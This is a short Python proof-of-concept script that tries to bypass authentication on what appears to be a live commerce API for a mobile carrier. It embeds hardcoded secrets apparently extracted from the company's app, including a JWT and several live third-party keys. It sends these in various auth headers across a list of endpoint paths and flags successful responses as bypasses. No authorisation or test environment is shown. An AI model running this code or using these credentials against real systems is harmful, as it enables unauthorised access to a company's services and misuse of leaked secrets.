#!/usr/bin/env python3
"""
Commerce API Auth Bypass Tester - Proof of Concept
Attempts to use hardcoded secrets to access the Commerce API

Target: https://commerce-api.ultramobile.com/v1/mint
"""

import requests
import json
from rich.console import Console

console = Console()

# Hardcoded secrets from previous analysis
SECRETS = {
    'MINT_JWT': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE1MDc3NjY4MjQsIm5iZiI6MTUwNzc2NjgyNCwiZXhwIjoxNTk0MDgwNDI0LCJhdWQiOiJNaW50QXBwIiwiaXNzIjoiVUxUUkEifQ.r909IZmcavEhqvZO0td_-Ts_q27BBk4cCbFRXpDBQUM',
    'IP_QUALITY_SCORE': 'k4SIcTwQiZGRbWApqtvPPKdveLjuL4ej1I4Eqf6321Km67HZNJoi1GtGH5iOJHPD',
    'BRANCH_KEY': 'key_live_koP1JAQau1WK4fKP1STYnlmguzlzrqr3',
    'AMPLITUDE': '09231407cbe47ad146724642bd66c156',
    'KLAVYO': 'H8tAtU',
    'BRAZE': '8cad9a3e-60eb-47ab-b782-22b33974568c',
    'LD_KEY': 'mob-82856bdd-1e79-4d98-a55f-be43b733543b'
}

BASE_URL = "https://commerce-api.ultramobile.com/v1/mint"

def test_auth_headers(path: str = ""):
    url = f"{BASE_URL}{path}"
    console.print(f"\n[cyan]🔍 Testing Endpoint: {url}[/cyan]")
    
    # 1. Test JWT as Bearer token
    headers = {'Authorization': f'Bearer {SECRETS["MINT_JWT"]}'}
    try:
        r = requests.get(url, headers=headers, timeout=10)
        console.print(f"  [yellow]Bearer JWT:[/yellow] {r.status_code} - {r.text[:100]}")
        if r.status_code == 200: console.print("  [red]✗ AUTH BYPASS SUCCESS![/red]")
    except Exception as e: pass

    # 2. Test JWT as x-access-token (common in some frameworks)
    headers = {'x-access-token': SECRETS["MINT_JWT"]}
    try:
        r = requests.get(url, headers=headers, timeout=10)
        console.print(f"  [yellow]x-access-token JWT:[/yellow] {r.status_code} - {r.text[:100]}")
        if r.status_code == 200: console.print("  [red]✗ AUTH BYPASS SUCCESS![/red]")
    except Exception as e: pass

    # 3. Test Braze Key as auth header
    headers = {'Authorization': f'Bearer {SECRETS["BRAZE"]}'}
    try:
        r = requests.get(url, headers=headers, timeout=10)
        console.print(f"  [yellow]Bearer Braze:[/yellow] {r.status_code} - {r.text[:100]}")
    except Exception as e: pass

    # 4. Test combinations
    headers = {
        'x-api-key': SECRETS["AMPLITUDE"],
        'Authorization': f'Bearer {SECRETS["MINT_JWT"]}'
    }
    try:
        r = requests.get(url, headers=headers, timeout=10)
        console.print(f"  [yellow]Combined Headers:[/yellow] {r.status_code} - {r.text[:100]}")
    except Exception as e: pass

# Common patterns for commerce APIs
PATHS = [
    '',
    '/plans',
    '/products',
    '/orders',
    '/validate',
    '/config',
    '/health'
]

if __name__ == "__main__":
    for path in PATHS:
        test_auth_headers(path)
